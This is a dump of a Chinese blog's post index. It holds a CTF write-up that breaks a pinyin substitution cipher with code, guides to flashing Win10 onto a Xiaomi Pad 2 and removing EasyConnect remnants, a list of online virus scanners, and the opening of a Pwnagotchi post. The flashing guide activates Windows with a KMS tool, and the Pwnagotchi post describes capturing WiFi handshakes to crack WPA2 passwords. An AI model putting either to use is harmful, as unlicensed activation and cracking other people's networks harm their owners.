\n密文如下:\nLRZRLKOBNRLVIROZNKOHUKOBRSNRVUIRSNRXVRUVOXVRXYUYSNVOHGVRLROLROLDYIRBRLYOBNROFEKLRBNRURBNRJYKOSNKOHCKOCYBNKOMKOBNRMKOHSNRPROLRURCKOHBNYXYJRKOXVRUVONYBNVLKDPRBYDJYKOSNKOHMVRIRKDTKOHJROHJYVCYGKRKOIRKJRPRLRLROHZNRLRLRNKRLDYQDYBNRIRKJRWROHWROHMKOUKOJYVEKRBNRSNYGKRMVONVSNVOXVRUVOIRKDLYVPRVLKOSNRBRUYLYJYOHYIRKOHBNRLRJRYURZNYRPROHAKOWYDGYLRBNRQDOHPRKOBKRIRKMYCYLDYEYIROHYUVOBNVTKOHIRSYRLYPROZNYUKOBNVOIRJRKOPROKRGVRBNRVUGYBNRMVRUVOXVREYGRSNROFBYDPRZVOFJRVMYEYGYWROHOFLYVJYOSYDLRGYOVOHWVOHEKBNVWYLREYVUSNRHYKOZNYOPRYGKOHSNKOHEYUYJYOBNVJRUVOUYDGYWROHPRVNKOHPYLRTKOHBKOZDOHBNRSNKDPROHMKOHPRJRKDLROSDOHCYPRLYQVSYDOFGYBNRSYDBKRSNVOBNRSKOHSNRBNYVUEKDBNRSNYMYLROHJRNYLROFSYDLROZNYPYNKOSNYIRJRKOBNRBNRBNRJRYZNYHYDEVBNRNYBNRGYEDOHCYLRKRBNYOFOKRIRKLYVJYOBKRGYWROHEKOHIRKOHLDOHJYVLROSNRBNRPRAROHZNYAYBNRJYURLYKDIRVUTKOHLRSNYGYSNYPYOFGYBKRBVPRVJYKOTRYTKOQDOHMVROFJYVLROPYNKOSNYERGKJYKOBKNYOWKSYDLRXRBNRLRUREYNKOOFBNRJROHGYBNRJYVNYEYBNRJRLKOJYKOVUOFLRMKOHLREKJYXROHSDYBNYJYKOXRKDGYQVEVJRUVOHLYNKOSNYGKJYKOBNDOHEVBNRLVSNYGYSNYKOHLROBKRGKRBNYSNRGYCYEYOFOKRIRKLYBNRLRLYVSKOURGYHDOHEKOHCYPYBNRSKOURNYLRJYLROHOFVUBROFOKRIRSNDYLRIRKOSYDIRKOMYURHDOHLRPYTKOHSNDYLROHXYBNYMYIRKWKJRJRYBNRSYRSNDYLROHJRVGYJYVHYMYOFOKRURLYLROGDTKOHSYRTVVUMKOHEYOFLDYBDOHBNRZNYXVOSNRJRVQVLDYZRWRWKOHBNRXROHGKDBNYOFLYVBRQVLRZNYVUSNRLR\n解密过程单表加密, 最常见的做法就是做词频分析.\n如果是英文文本的话, 用quipqiup很快就能得解.\n但这里是中文拼音, 似乎没有现成的工具, 那就老老实实做词频分析.\n统计聊斋全书的拼音词频首先要知道中文拼音的一般频率分布, 这里我直接网上找《聊斋志异》的txt文本.\n去除前言什么的, 只留下小说部分, 保存txt为sample.txt, 运行如下代码 (GPT-4o)\nimport refrom collections import Counterfrom pypinyin import lazy_pinyin# 函数：读取文本文件并去除标点符号、空格等非中文字符def clean_text(filename):    with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        text = f.read()    # 使用正则表达式去除标点符号和非汉字字符    text = re.sub(r&#x27;[^\\u4e00-\\u9fa5]&#x27;, &#x27;&#x27;, text)  # 只保留中文字符    return text# 函数：提取拼音声母和韵母def extract_initial_and_final(word):    # 声母，包括组合声母    initials = [&#x27;b&#x27;, &#x27;p&#x27;, &#x27;m&#x27;, &#x27;f&#x27;, &#x27;d&#x27;, &#x27;t&#x27;, &#x27;n&#x27;, &#x27;l&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;h&#x27;, &#x27;j&#x27;, &#x27;q&#x27;, &#x27;x&#x27;, &#x27;z&#x27;, &#x27;c&#x27;, &#x27;s&#x27;, &#x27;r&#x27;, &#x27;zh&#x27;, &#x27;ch&#x27;, &#x27;sh&#x27;]    finals = [&#x27;a&#x27;, &#x27;o&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;ai&#x27;, &#x27;ei&#x27;, &#x27;ui&#x27;, &#x27;ao&#x27;, &#x27;ou&#x27;, &#x27;iu&#x27;, &#x27;ie&#x27;, &#x27;ve&#x27;, &#x27;er&#x27;, &#x27;an&#x27;, &#x27;en&#x27;, &#x27;in&#x27;, &#x27;un&#x27;, &#x27;ün&#x27;,              &#x27;ang&#x27;, &#x27;eng&#x27;, &#x27;ing&#x27;, &#x27;ong&#x27;]        # 使用pypinyin来获取拼音    pinyin_list = lazy_pinyin(word)    result = &#123;&#x27;initials&#x27;: [], &#x27;finals&#x27;: []&#125;        for p in pinyin_list:        # 优先处理组合声母 zh, ch, sh        for initial in [&#x27;zh&#x27;, &#x27;ch&#x27;, &#x27;sh&#x27;]:            if p.startswith(initial):  # 优先匹配组合声母                result[&#x27;initials&#x27;].append(initial)                p = p[len(initial):]  # 去掉已经匹配的声母部分                break                # 处理剩余的普通声母        for initial in [&#x27;b&#x27;, &#x27;p&#x27;, &#x27;m&#x27;, &#x27;f&#x27;, &#x27;d&#x27;, &#x27;t&#x27;, &#x27;n&#x27;, &#x27;l&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;h&#x27;, &#x27;j&#x27;, &#x27;q&#x27;, &#x27;x&#x27;, &#x27;z&#x27;, &#x27;c&#x27;, &#x27;s&#x27;, &#x27;r&#x27;]:            if p.startswith(initial):                result[&#x27;initials&#x27;].append(initial)                p = p[len(initial):]  # 去掉已经匹配的声母部分                break        # 处理韵母        for final in finals:            if p.endswith(final):                result[&#x27;finals&#x27;].append(final)                break    return result# 函数：统计拼音声母和韵母的频率，同时生成拼音大写形式def count_pinyin(text):    initial_counter = Counter()    final_counter = Counter()    pinyin_list = []  # 存储拼音的大写形式        # 遍历文本中的每个字    for word in text:        # 提取每个字的声母和韵母        result = extract_initial_and_final(word)        # 更新频率统计        initial_counter.update(result[&#x27;initials&#x27;])        final_counter.update(result[&#x27;finals&#x27;])                # 将拼音转换为大写并保存到pinyin_list        pinyin_list.extend(lazy_pinyin(word))        # 拼音大写并去除分隔符    pinyin_text = &#x27;&#x27;.join([p.upper() for p in pinyin_list])        # 按照频率从大到小排序    sorted_initials = initial_counter.most_common()  # 返回排序后的声母    sorted_finals = final_counter.most_common()      # 返回排序后的韵母        return sorted_initials, sorted_finals, pinyin_text# 主函数def main():    filename = &#x27;sample.txt&#x27;  # 中文文本文件路径    text = clean_text(filename)    # 清理文本        initial_freq, final_freq, pinyin_text = count_pinyin(text)  # 统计声母和韵母频率，并获取拼音大写文本        # 输出声母频率，按频率从大到小排序    print(&quot;声母频数统计：&quot;)    for initial, count in initial_freq:        print(f&quot;&#123;initial&#125;: &#123;count&#125;&quot;)        # 输出韵母频率，按频率从大到小排序    print(&quot;\\n韵母频数统计：&quot;)    for final, count in final_freq:        print(f&quot;&#123;final&#125;: &#123;count&#125;&quot;)        # 将拼音大写文本写入到pinyin.txt文件中    with open(&#x27;pinyin.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as pinyin_file:        pinyin_file.write(pinyin_text)if __name__ == &#x27;__main__&#x27;:    main()\n\n得到如下排好序的频数表:\n声母频数统计：zh: 29643sh: 28934j: 28765q: 18439x: 18200b: 17367r: 14622d: 14158l: 13905g: 13834h: 13649z: 12934n: 11449f: 11430m: 10998s: 10567ch: 9473t: 7654c: 6688k: 5939p: 3464韵母频数统计：i: 111316u: 76706an: 32737e: 32492o: 26338ang: 19494en: 14397ing: 12005ong: 11837a: 11427eng: 11316in: 8509er: 6659un: 5059v: 3797\n统计密文的词频将密文保存到ciphertext.txt, 运行如下代码 (GPT-4o):\ndef getNWordList(n):    &quot;&quot;&quot;    生成 N 元字符频率列表，并保存到文件。    :param n: N 元词，1表示单字母，2表示二元字母，3表示三元字母，依此类推    :return: 返回频率列表    &quot;&quot;&quot;    c_file = open(&#x27;ciphertext.txt&#x27;)  # 读取文件    c_text = c_file.read()  # 读取文本    char_list = list(c_text)  # 转化为列表，每个字母为一个元素    word_list = []        # 处理 n = 1 的情况    if n == 1:        word_list = char_list  # 直接使用字符列表    else:        # 获取 N 元字符组合        for i in range(0, len(char_list) - n + 1):  # 从当前位置开始取 n 个字符            temp_list = char_list[i:i + n]  # 获取连续 n 个字符            temp_str = &quot;&quot;.join(temp_list)  # 将这些字符组合成一个字符串            if len(temp_str) &gt; 1:  # 确保字符组合的长度大于1                word_list.append(temp_str)        # 统计加密字符串中各个 N 元字符的出现次数    tempSet = set(word_list)  # 转为集合去重    # 保存为字典，key:字母组合，value:出现次数    tempDict = &#123;&#125;    for i in tempSet:        tempDict[i] = word_list.count(i)    # 列表排序, 以元组形式    dict_sorted = sorted(tempDict.items(), key=lambda x: x[1], reverse=True)    # 输出到文件    file_name = f&#x27;fre_&#123;n&#125;.txt&#x27;    with open(file_name, &#x27;w&#x27;) as f:        print(f&quot;&#123;n&#125;元字母&quot;, &quot;出现次数&quot;, &quot;\\t频率&quot;, file=f)        for i in dict_sorted:            if i[1] &gt; 1:  # 检查字母组合出现次数大于1                print(f&quot;&#123;i[0]&#125;\\t\\t&#123;i[1]&#125;\\t\\t&#123;i[1] / len(c_text)&#125;&quot;, file=f)    # 返回频率列表    frequency_list = [i[0] for i in dict_sorted if i[1] &gt; 1]    return frequency_list# 调用函数，获取各个元词频getNWordList(1)  # 1 元词getNWordList(2)  # 2 元词getNWordList(3)  # 3 元词getNWordList(4)  # 4 元词getNWordList(5)  # 5 元词getNWordList(6)  # 6 元词\n得到如下结果 (只截取部分):\nfre_1.txtfre_2.txtfre_3.txtfre_4.txtfre_5.txtfre_6.txt1元字母 出现次数 \t频率R\t\t197\t\t0.15354637568199533Y\t\t148\t\t0.11535463756819954O\t\t141\t\t0.10989867498051442N\t\t99\t\t0.07716289945440374K\t\t98\t\t0.07638347622759158V\t\t68\t\t0.05300077942322681H\t\t62\t\t0.048324240062353856B\t\t62\t\t0.048324240062353856L\t\t62\t\t0.048324240062353856...2元字母 出现次数 \t频率KO\t\t58\t\t0.04520654715510522OH\t\t56\t\t0.043647700701480906BN\t\t45\t\t0.03507404520654715NR\t\t44\t\t0.034294621979735LR\t\t37\t\t0.028838659392049885RO\t\t35\t\t0.027279812938425563NY\t\t30\t\t0.02338269680436477SN\t\t30\t\t0.02338269680436477IR\t\t21\t\t0.01636788776305534RL\t\t20\t\t0.01558846453624318RK\t\t20\t\t0.01558846453624318JY\t\t20\t\t0.01558846453624318...3元字母 出现次数 \t频率BNR\t\t32\t\t0.02494154325798909KOH\t\t24\t\t0.018706157443491817ROH\t\t18\t\t0.014029618082618862LRO\t\t14\t\t0.010911925175370226YBN\t\t14\t\t0.010911925175370226RBN\t\t12\t\t0.009353078721745909YLR\t\t12\t\t0.009353078721745909IRK\t\t12\t\t0.009353078721745909SNR\t\t11\t\t0.00857365549493375RSN\t\t10\t\t0.00779423226812159NKO\t\t10\t\t0.00779423226812159...4元字母 出现次数 \t频率YBNR\t\t10\t\t0.00779423226812159RBNR\t\t9\t\t0.007014809041309431JYKO\t\t7\t\t0.005455962587685113BNRS\t\t7\t\t0.005455962587685113YLRO\t\t6\t\t0.004676539360872954RUVO\t\t6\t\t0.004676539360872954TKOH\t\t6\t\t0.004676539360872954KOSN\t\t6\t\t0.004676539360872954RIRK\t\t6\t\t0.004676539360872954BNRJ\t\t6\t\t0.004676539360872954NRLR\t\t5\t\t0.003897116134060795KOHS\t\t5\t\t0.003897116134060795OBNR\t\t5\t\t0.003897116134060795NKOH\t\t5\t\t0.003897116134060795OHBN\t\t5\t\t0.003897116134060795LROH\t\t5\t\t0.003897116134060795WROH\t\t5\t\t0.003897116134060795BNRL\t\t5\t\t0.003897116134060795...5元字母 出现次数 \t频率OHBNR\t\t4\t\t0.003117692907248636VRUVO\t\t4\t\t0.003117692907248636KOHSN\t\t4\t\t0.003117692907248636YLROH\t\t4\t\t0.003117692907248636OFOKR\t\t4\t\t0.003117692907248636BNRSN\t\t3\t\t0.002338269680436477YOFOK\t\t3\t\t0.002338269680436477YNKOS\t\t3\t\t0.002338269680436477SNKOH\t\t3\t\t0.002338269680436477...6元字母 出现次数 \t频率YNKOSN\t\t3\t\t0.002338269680436477XVRUVO\t\t3\t\t0.002338269680436477OFOKRI\t\t3\t\t0.002338269680436477YOFOKR\t\t3\t\t0.002338269680436477SNDYLR\t\t3\t\t0.002338269680436477FOKRIR\t\t3\t\t0.002338269680436477GYWROH\t\t3\t\t0.002338269680436477NKOSNY\t\t3\t\t0.002338269680436477YVUSNR\t\t2\t\t0.001558846453624318KOHBNR\t\t2\t\t0.001558846453624318SNYGYS\t\t2\t\t0.001558846453624318GKJYKO\t\t2\t\t0.001558846453624318YBNRSY\t\t2\t\t0.001558846453624318...\n\n\n很容易推断出R = i, KOH = ang, BN = zh / sh等.\n但随即我发现, 根本没有必要根据词频猜测破解密码表.\npinyin.txt, 也就是《聊斋志异》全文的拼音,只有112w个字符.\n因此, 我们可以直接O(N)暴力匹配密文片段!\n对于这样的密文片段:BNROFEKLRBNRURBNRJYKOSNKOHCKOCYBNKOMKOBNR\n它的pattern也就是\nABC &#123;6X&#125; ABC &#123;2X&#125; ABC &#123;21X&#125; ABC \n\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;char str[1130000];int indent[5] = &#123;6, 2, 21&#125;;_Bool check(int i)&#123;    // 没错, 很暴力, 主打一个能跑就行    return (str[i] == str[i+indent[0]+3] &amp;&amp;           str[i] == str[i+indent[0]+3+indent[1]+3] &amp;&amp;           str[i] == str[i+indent[0]+3+indent[1]+3+indent[2]+3] &amp;&amp;           str[i+1] == str[i+1+indent[0]+3] &amp;&amp;           str[i+1] == str[i+1+indent[0]+3+indent[1]+3] &amp;&amp;           str[i+1] == str[i+1+indent[0]+3+indent[1]+3+indent[2]+3] &amp;&amp;           str[i+2] == str[i+2+indent[0]+3] &amp;&amp;           str[i+2] == str[i+2+indent[0]+3+indent[1]+3] &amp;&amp;           str[i+2] == str[i+2+indent[0]+3+indent[1]+3+indent[2]+3]);&#125;int main()&#123;    freopen(&quot;pinyin.txt&quot;, &quot;r&quot;, stdin);    fgets(str, 1130000, stdin);    fclose(stdin);    for(int i = 0; i &lt; strlen(str) - 100; ++i)&#123;        if(check(i))&#123;            for(int j = i; j &lt; i + 100; ++j)&#123;                putchar(str[j]);            &#125;            puts(&quot;&quot;);        &#125;    &#125;&#125;\n在原文中有唯一匹配, 对应的原文拼音为:\nZHINVDAYIZHIRIZHIJUANSHANGFANFUZHANWANZHI\n在pinyin.txt中搜索该串字符, 很容易找出密文对应的原文拼音为:\nYICIYANZHIYEXINCHANGRANZISHIERXISHIMEIRENMEIMURUSHENGBEIYINYINYOUXIZIYUNZHINVDAYIZHIRIZHIJUANSHANGFANFUZHANWANZHIWANGSHIQINYIRIFANGZHUMUJIANMEIRENHUZHEYAOQIZUOJUANSHANGWEIXIAOLANGJINGJUEFUBAIANXIAJIQIYIYINGCHIYIYIHAIYOUKOUZHIXIAJITINGTINGWANRANJUEDAIZHISHUBAIWENHESHENMEIRENXIAOYUEQIEYANSHIZIRUYUJUNGUXIANGZHIYIJIURICHUIQINGPANTUOBUYIZHIKONGQIANZAIXIAWUFUYOUDUXINGURENZHELANGXISUIYUQINCHURANZHENXIJIANQINAIBEIZHIERBUZHIWEIRENMEIDUBISHINVZUOQICENVJIEWUDUBUTINGNVYUEJUNSUOYIBUNENGTENGDAZHETUYIDUERSHIGUANCHUNQIUBANGSHANGDURUJUNZHEJIRENRUOBUTINGQIEXINGQUYILANGZANCONGZHISHAOQINGWANGQIJIAOYINSONGFUQIYUKESUONVBUZHISUOZAISHENZHISANGSHIZHUERDAOZHISHUWUYINGJIHUYINVSUOYINCHUQUHANSHUXIJIANZHIZHIZHIJIUCHUGUODEZHIHUZHIBUDONGFUYIAIZHUNVNAIXIAYUEJUNZAIBUTINGDANGXIANGYONGJUEYINSHIZHIQIPINGCHUPUZHIJURIYUAOXIERLANGYISHUBUSHUQUNVBUZAIZEQIEJUANLIULANKONGWEINVJUEYINQUHANSHUDIBAJUANZAHUNTASUOYIMIZHIYIRIDUHANNVZHIJINGBUZHIJUEHUDUZHIJIYANJUANERNVYIWANGYIDAJUMINGSOUZHUJUANMIAOBUKEDEJIRENGYUHANSHUBAJUANZHONGDEZHIYESHUBUSHUANGYINZAIBAIZHUSHIBUFUDUNVNAIXIAYUZHIYIYUESANRIBUGONGDANGFUQUZHISANRIHUYIJUYINGNVERZINVNAIXISHOUYIXIANSUOXIANWURIGONGYIQULANGSHOUYINGMUZHUWUXIATAJIJIUZHISUISHOUYINGJIEBUJUEGUWUNVNAIRIYUYINBOLANGSUILEERWANGDUNVYOUZONGZHICHUMENSHIJIEKEYOUCITITANGZHIMINGBAOZHUNVYUEZIKEYICHUERSHIYI\n\n根据拼音获取原文水平过低, 一眼看不出原文.只能写代码跑了…废物GPT-4o写不出能跑的代码, 还得我自己写.\nimport refrom pypinyin import lazy_pinyindef getText(file: str) -&gt; str:    # 读取原文, 并过滤掉非中文字符    with open(file, &quot;r&quot;, encoding = &quot;utf-8&quot;, errors = &quot;ignore&quot;) as f:        text = f.read()    text = re.sub(r&quot;[^\\u4e00-\\u9fa5]&quot;, &quot;&quot;, text)    return textdef getPinyin(text: list) -&gt; str:    # 文本转拼音    pinyin:list = lazy_pinyin(text)    return &quot;&quot;.join(pinyin)def find(pattern: str, text: str, length:int = 14) -&gt; str:    for i in range(len(text) - length + 1):        tmp = text[i : i + length]        tmp_pinyin = getPinyin(tmp)        if tmp_pinyin == pattern: return tmp        return &quot;匹配失败.&quot;def main():    file = &quot;sample.txt&quot;    pattern = &quot;zhinvdayizhirizhijuanshangfanfuzhanwanzhi&quot; # 14~15个拼音, 取决于juan还是ju an    text = getText(file)    match = find(pattern, text)    print(f&quot;Result:  &#123;match&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()\nResult:  织女大异之日置卷上反复瞻玩至\n很容易就定位到原文了:\n...以此验之耶？”心怅然自失。而细视美人，眉目如生；背隐隐有细字云：“织女。”大异之。日置卷上，反复瞻玩，至忘食寝。一日方注目间，美人忽折腰起，坐卷上微笑。郎惊绝，伏拜案下。既起，已盈尺矣。益骇，又叩之。下几亭亭，宛然绝代之姝。拜问：“何神？”美人笑曰：“妾颜氏，字如玉，君固相知已久。日垂青盼，脱不一至，恐千载下无复有笃信古人者。”郎喜，遂与寝处。然枕席间亲爱倍至，而不知为人。每读必使女坐其侧。女戒勿读，不听；女曰：“君所以不能腾达者，徒以读耳。试观春秋榜上，读如君者几人？若不听，妾行去矣。”郎暂从之。少顷忘其教，吟诵复起。逾刻索女，不知所在。神志丧失，嘱而祷之，殊无影迹。忽忆女所隐处，取《汉书》细检之，直至旧处，果得之。呼之不动，伏以哀祝。女乃下曰：“君再不听，当相永绝！”因使治棋枰、樗蒲之具，日与遨戏。而郎意殊不属。觑女不在，则窃卷流览。恐为女觉，阴取《汉书》第八卷，杂混他所以迷之。一日读酣，女至竟不之觉；忽睹之，急掩卷而女已亡矣。大惧，冥搜诸卷、渺不可得；既，仍于《汉书》八卷中得之，页数不爽。因再拜祝，矢不复读。女乃下，与之弈，曰：“三日不工，当复去。”至三日，忽一局赢女二子。女乃喜，授以弦索，限五日工一曲。郎手营目注，无暇他及；久之随手应节，不觉鼓舞。女乃日与饮博，郎遂乐而忘读，女又纵之出门，使结客，由此倜傥之名暴著。女曰：“子可以出而试矣。”\n摘自《聊斋志异》卷十一·书痴\n求密码表with open(&quot;en.txt&quot;, &quot;r&quot;) as f:    en = f.read()with open(&quot;de.txt&quot;, &quot;r&quot;) as f:    de = f.read()key_list = &#123;&#125;for i in range(len(en)):    if en[i] not in key_list:        key_list[en[i]] = de[i]    else:        if de[i] != key_list[en[i]]:            print(f&quot;Error at position &#123;i&#125;: The mapping is &#123;en[i]&#125; -&gt; &#123;key_list[en[i]]&#125; but &#123;de[i]&#125; is expected.&quot;)for i in range(65, 91):    if chr(i) not in key_list:        print(i, &quot;not found&quot;)    else:        print(f&quot;&#123;chr(i)&#125; -&gt; &#123;key_list[chr(i)]&#125;&quot;)\nError at position 545: The mapping is N -&gt; H but X is expected.Error at position 546: The mapping is K -&gt; A but I is expected.A -&gt; PB -&gt; ZC -&gt; FD -&gt; OE -&gt; DF -&gt; VG -&gt; BH -&gt; GI -&gt; XJ -&gt; JK -&gt; AL -&gt; YM -&gt; WN -&gt; HO -&gt; NP -&gt; QQ -&gt; KR -&gt; IS -&gt; ST -&gt; LU -&gt; RV -&gt; EW -&gt; TX -&gt; MY -&gt; UZ -&gt; C\n有2个字符没对应上, 应该是多音字导致的, 无伤大雅.\n密码表如下:\n\n\n\n映射前\n映射后\n\n\n\nA\nP\n\n\nB\nZ\n\n\nC\nF\n\n\nD\nO\n\n\nE\nD\n\n\nF\nV\n\n\nG\nB\n\n\nH\nG\n\n\nI\nX\n\n\nJ\nJ\n\n\nK\nA\n\n\nL\nY\n\n\nM\nW\n\n\nN\nH\n\n\nO\nN\n\n\nP\nQ\n\n\nQ\nK\n\n\nR\nI\n\n\nS\nS\n\n\nT\nL\n\n\nU\nR\n\n\nV\nE\n\n\nW\nT\n\n\nX\nM\n\n\nY\nU\n\n\nZ\nC\n\n\n找出多音字学长希望找到这个多音字, 随便写了份代码:\nimport refrom collections import Counterfrom pypinyin import lazy_pinyindef clean_text(filename):    with open(filename, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        text = f.read()    text = re.sub(r&quot;[^\\u4e00-\\u9fa5]&quot;, &quot;&quot;, text)  # 只保留中文字符    return textdef go():    text = clean_text(&quot;ans.txt&quot;)    pinyin_list = &quot;&quot;    for i in text:        ipinyin:list = lazy_pinyin([i])        pinyin_list += &quot;&quot;.join(ipinyin)        if(len(pinyin_list) &gt;= 540 and len(pinyin_list) &lt;= 550): print(i, end = &quot; &quot;)if __name__ == &quot;__main__&quot;:    go()\n输出听 妾 行, 可知行是多音字. lazy_pinyin提供的拼音为XING而密文里的拼音是HANG. 显然正确发音应为XING.\n","categories":["CTF"],"tags":["Crypto"]},{"title":"小米平板2刷精简版Win10","url":"/2025/03/08/%E5%B0%8F%E7%B1%B3%E5%B9%B3%E6%9D%BF2%E5%88%B7%E7%B2%BE%E7%AE%80%E7%89%88Win10/","content":"花 110r 在小黄鱼上捡了一块 2+16 的小米平板2, 并刷上俄罗斯大神 Lopatkin 的 Win10 系统.\n\n  \n    由于我的这块板子已经被刷过了, 所以刷机的过程可能有些不同, 仅供参考. \n\n  \n\n材料清单\n2+16 小米平板2\n16G+ 的 U盘\nOTG转接口\n蓝牙鼠标\n\n\n\n577 Win10 系统镜像(64位) 下载地址在第12楼\n小米平板2 驱动 下载地址在2楼\n\n\n\nDISM++\nUltraISO\nDiskGenius\n\n刷机步骤先给板子充满电, 保证它能够撑过装机的时间.\n使用 DiskGenius 把 U盘 格式化为 FAT32 格式.\n然后使用 UltraISO 将系统写入 U盘.\n接着打开 DISM++ 工具, 挂载镜像. (U盘里的 sources/install.wim 文件)\n在 &lt;驱动管理&gt; 处先安装驱动.\n\n如果需要NET4.8, 可以从这里下载:\n8楼下载NET4.8.\n解压出 Win10LTSB2016netfx48-2305.sut, 在 &lt;程序和功能&gt; 处安装.\n在这里获取 KMS 激活工具.\n\n下载后拷贝到挂载目录的 /用户/公用 文件夹中, 用于安装后激活系统.\n可以在这个目录下扔一些安装包, 在系统安装好后安装.\n完事后保存映像, 卸载映像, 拔出 U盘, 用 OTG 转接口连接 USB拓展坞和关机了的小米平板2上.\n把 U盘和蓝牙鼠标的无线发射器都连到拓展坞上, 开机. (不清楚能不能在引导界面安装触屏驱动)\n屏幕会反复闪烁小米Logo, 最后出现 Win10 的引导安装界面.\n选择高级安装.\n删掉所有的分区, 直到剩一个”未分配的空间”.\n接着选择”新建”和”确定”, 会自动出现4个分区, 选择空间最大的那个”主分区”并点击”下一步”.\n然后耐心等待.\n安装结束后会重启板子, 请在重启前拔下 U盘.\n重启后, 先跳过WIFI设置.\n自定义设置, 把那些”个性化”设置全关掉.\n设置用户名. (用屏幕键盘输入用户名, 密码留空)\n进入系统, 用 KMS 激活工具激活系统, 即可开始享受.\n使用体验我这台板子, 刚装完机, 系统占用 RAM 为 700 MB 左右, 经过一段时间的使用, RAM 稳定在 900 MB 左右.\n装完机, 磁盘还剩下 6.7 GB 的空间.\nRAM太小了, 连用 Koodo Reader 看PDF都做不到. (分1个G的虚拟内存后就可以了)\n但可以用 Moonlight 串流控制 PC, 玩gal非常爽 不得不说 Moonlight 的优化是真的好, 不但能流畅地跑 2K 30帧, 而且占用只用 200 MB !\n没有明显的发热.\n总体来说, 110r 应该不算亏.\n","categories":["杂项"],"tags":["资源分享","小米平板2","刷机"]},{"title":"完美卸载EasyConnect / Sangfor VPN","url":"/2025/03/02/%E5%AE%8C%E7%BE%8E%E5%8D%B8%E8%BD%BDEasyConnect-Sangfor-VPN/","content":"为了写这篇文章, 又安装了一遍万恶的EasyConnect:\n\n奇异搞笑的EULA.\n\n\n点击\"同意\"后就开始迫不及待地往系统里拉shit.\n\n\n启动后接着拉.\n\n\n删除本体先去下载geek, 这是一个软件卸载工具, 卸载后会扫描并删除注册表里的残留项, 小巧好用.\n(也可以使用HiBit Uninstaller, 据说这个工具删得更彻底, 但我没使用过, 不作评价)\n解压后以管理员身份运行geek.exe, 选择EasyConnect这条, 选择”卸载“.\n\n\n正常的软件, 卸载完后就可以了, 但流氓软件不一样. 此时你在Program Files (x86)里仍然能看到这个Sangfor文件夹.\n用Everything搜了一下Sangfor, 发现一堆残留文件夹:\n\nC:\\Program Files (x86)\\Sangfor\nC:\\ProgramData\\Sangfor\nC:\\Users\\Coast23\\AppData\\Roaming\\Sangfor\nC:\\Windows\\System32\\DriverStore\\FileRepository\\sangforvnic.inf_amd64_9183b83f3b2f3cd1\nC:\\Users\\Public\\Sangfor\n\n以及一大堆残留文件.\n全部删掉, 最后删不掉的有这些:\n\n如果你选择删除这些文件的话:\n\n似乎是附加到大部分系统进程了.\n所以需要在安全模式里删除它.\nWin + R, 输入msconfig, 回车.\n引导 -&gt; 勾上安全引导 -&gt; 应用 -&gt; 确定 -&gt; 重新启动\n\n重启后, 就进入了安全模式.\n在安全模式下删掉那些残留文件即可.\n删完后, 还是是在msconfig里, 把安全引导的勾去掉, 再次重启, 回到正常系统.\n如果删除的时候遇到这种情况:\n\n图省事就用文件粉碎工具(我安装了火绒, 用火绒的文件粉碎器), 或者修改文件权限.\n修改文件权限参考这篇文章.\n到这里, Sangfor软件本体就删干净了.\n整个删除过程也可参考CSDN上的这篇文章.\n\n删除CA证书接着删掉Sangfor留下的CA证书.\nWin + R输入certmgr.msc, 回车, 打开证书管理器.\n\n右键证书 - 当前用户 -&gt; 查找证书 -&gt; 输入Sangfor -&gt; 立即查找\n找到的证书全部右键删除.\n\n[未解决] 删除残留注册表项注册表里仍然有很多垃圾.\n你可以在powershell中输入如下命令\nGet-ChildItem -Path &quot;HKLM:\\&quot;, &quot;HKCU:\\&quot; -Recurse -ErrorAction SilentlyContinue |&gt; Where-Object &#123; $_.Name -match &quot;Sangfor&quot; &#125;\n\n来列出所有与Sangfor有关的注册表项:\n\n然后在regedit中一项一项删除.\n但这方法看起来就很蠢.\n而我目前也不知道有什么比较好的, 清理注册表的方法.\n试过Wise Registry Cleaner和CCleaner(这也算个流氓软件), 确实清了一堆注册表垃圾, 但还是删不掉Sangfor的注册表项.\n算了, 就这样吧. 已经够完美了.\n","categories":["杂项"]},{"title":"分享几个在线病毒检测网站","url":"/2025/01/25/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%9C%A8%E7%BA%BF%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99/","content":"原计划分享一些常用的病毒检测网站, 但在撰稿时才发现, 想要介绍的一些网站现在都强制要求注册甚至付费了, 与我的白嫖理念相悖. 结果最后只有  个可以分享的网站.\n 个网站, 作为bookmarks的话好像还是有点多, 所以还是挂一篇文章出来吧. 反正也没人看.\n1. VirusTotal\n\n著名的病毒文件扫描网站, 可以扫描可疑文件和URL.\n特点:\n文件大小限制: 650 MB.\n\n文件格式不限\n\n上传文件时可能被Google的人机验证整到自闭.\n\n\n VirusTotal 传送门\n\n VirusTotal 食用教程\n\n\n2. VirScan\n\n国内最早做文件在线检测的平台之一, 集成了  款国际知名的扫描引擎.\n特点:\n文件大小限制: 100 MB.\n\n文件格式不限\n\n\n VirScan 传送门\n\n__\n3. 腾讯哈勃分析系统\n\n鹅厂研发的安全辅助平台, 与前  个网站不同, 它能够列出程序的潜在恶意行为.\n特点:\n必须登入QQ才能使用\n\n文件大小限制: 30 MB.\n\n文件格式限制如下图:\n\n\n\n 腾讯哈勃分析系统 传送门\n\n\n4. Hybrid-Analysis\n真神, 如果需要免费且专业的报告的话, 它应该是唯一的选择了.\n特点:\n文件大小限制: 100 MB.\n可选多种沙箱环境:\n\n\n\n有该死的谷歌人机验证\n\n报告非常非常详尽! 截图截不下, 放个样本链接自行感受.\n\n\n Hybrid-Analysis 传送门\n","categories":["杂项"],"tags":["资源分享"]},{"title":"电子宠物-Pwnagotchi 制作记录","url":"/2025/04/10/%E7%94%B5%E5%AD%90%E5%AE%A0%E7%89%A9-Pwnagotchi-%E5%88%B6%E4%BD%9C%E8%AE%B0%E5%BD%95/","content":"简介Pwnagotchi 是一款开源的电子宠物, 利用 Bettercap 捕捉 WiFi 包 (实际上我们只想要握手包, 用于破解 WPA2 密码), 并以 .pcap 格式保存.\n最大的亮点当然是 可爱的 UI 啦.\n它长这样: 👇\n\n想了解更多? 请访问:\n\n官方网站: https://pwnagotchi.ai/\n\n社区网站: 